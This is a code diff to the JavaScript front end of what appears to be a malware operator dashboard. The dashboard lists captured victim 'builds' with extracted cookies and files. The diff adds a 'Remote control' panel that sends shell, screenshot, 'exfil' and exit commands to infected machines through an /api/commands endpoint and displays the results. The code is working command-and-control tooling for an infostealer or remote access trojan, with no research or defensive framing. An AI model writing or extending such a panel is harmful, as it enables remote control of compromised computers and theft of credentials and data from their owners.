@@ -167,6 +167,8 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     function showDetails(log) {
+        currentLogUuid = log.uuid;
+
         const cookies = extractCookies(log.data);
         const cookieBlock = cookies ? `
             <section class="detail-section">
@@ -195,6 +197,33 @@ document.addEventListener('DOMContentLoaded', () => {
             </section>
         ` : '';
 
+        const commands = (log.commands || []);
+        const commandItems = (commands.length ? commands : []).map((cmd) => `
+            <div style="border-left: 3px solid ${cmd.status === 'done' ? '#2e7d32' : cmd.status === 'failed' ? '#c62828' : '#b8860b'}; padding-left: 10px; margin: 8px 0;">
+                <div class="eyebrow">#${cmd.id} ${escapeHtml(cmd.type)} &middot; ${escapeHtml(cmd.status)} &middot; ${escapeHtml(cmd.createdAt)}</div>
+                <div style="font-size: 13px; margin-top: 2px;">${escapeHtml(cmd.args || '(no args)')}</div>
+                ${cmd.result ? `<pre style="margin: 4px 0 0; font-family: monospace; font-size: 13px; max-height: 180px; overflow-y: auto; background: var(--panel-soft); color: var(--text); border: 1px solid var(--line); border-radius: var(--radius); padding: 8px;">${escapeHtml(cmd.result)}</pre>` : ''}
+            </div>
+        `).join('');
+
+        const commandBlock = `
+            <section class="detail-section">
+                <h3>Remote control</h3>
+                <form id="cmdForm" style="display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 10px;">
+                    <select id="cmdType" style="padding: 8px; background: var(--panel-soft); color: var(--text); border: 1px solid var(--line); border-radius: var(--radius);">
+                        <option value="shell">shell</option>
+                        <option value="screenshot">screenshot</option>
+                        <option value="exfil">exfil</option>
+                        <option value="exit">exit</option>
+                    </select>
+                    <input type="text" id="cmdArgs" placeholder="Command (shell only)..." style="flex: 1; min-width: 180px; padding: 8px; background: var(--panel-soft); color: var(--text); border: 1px solid var(--line); border-radius: var(--radius);">
+                    <button type="submit" class="button" style="padding: 8px 16px;">Send</button>
+                    <span id="cmdStatus" style="align-self: center; font-size: 12px; color: var(--text-dim);"></span>
+                </form>
+                ${commandItems || '<div style="color: var(--text-dim); font-size: 13px;">No commands issued yet.</div>'}
+            </section>
+        `;
+
         modalData.innerHTML = `
             <p class="eyebrow">Details</p>
             <h2 id="modalTitle">${escapeHtml(log.uuid || 'Structure')}</h2>
@@ -204,6 +233,7 @@ document.addEventListener('DOMContentLoaded', () => {
             </section>
             ${cookieBlock}
             ${eventBlock}
+            ${commandBlock}
             <section class="detail-section">
                 <h3>Associated files</h3>
                 <ul class="download-list">
@@ -213,6 +243,50 @@ document.addEventListener('DOMContentLoaded', () => {
         `;
         modal.classList.add('active');
         modal.setAttribute('aria-hidden', 'false');
+    }
+
+    let currentLogUuid = null;
+
+    // Issue a remote command to the opened build and refresh the modal.
+    async function sendCommand(e) {
+        if (e) e.preventDefault();
+        const form = document.getElementById('cmdForm');
+        if (!form || !currentLogUuid) return;
+        const type = document.getElementById('cmdType').value;
+        let args = document.getElementById('cmdArgs').value.trim();
+        const statusEl = document.getElementById('cmdStatus');
+        statusEl.textContent = 'Sending...';
+        try {
+            if (type === 'shell' && !args) args = 'echo no command provided';
+            if (type !== 'shell') args = '';
+            const response = await fetch(`/api/commands/${encodeURIComponent(currentLogUuid)}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ type, args })
+            });
+            const data = await response.json();
+            if (!response.ok) throw new Error(data.error || 'Failed to issue command');
+            statusEl.textContent = `Queued as #${data.id}`;
+            document.getElementById('cmdArgs').value = '';
+            await refreshOpenBuild(currentLogUuid);
+        } catch (err) {
+            statusEl.textContent = err.message;
+        }
+    }
+
+    // Refresh just the command history inside the open modal.
+    async function refreshOpenBuild(uuid) {
+        try {
+            const response = await fetch('/api/logs');
+            if (!response.ok) return;
+            const logs = await response.json();
+            const build = logs.find(l => l.uuid === uuid);
+            if (build) {
+                const prevScroll = modal.scrollTop;
+                showDetails(build);
+                modal.scrollTop = prevScroll;
+            }
+        } catch (_) {}
     }
 
     function closeModal() {
@@ -555,6 +629,9 @@ document.addEventListener('DOMContentLoaded', () => {
     closeBtn.addEventListener('click', closeModal);
     modal.addEventListener('click', (event) => {
         if (event.target === modal) closeModal();
+    });
+    modal.addEventListener('submit', (event) => {
+        if (event.target && event.target.id === 'cmdForm') sendCommand(event);
     });
     window.addEventListener('keydown', (event) => {
         if (event.key === 'Escape') closeModal();
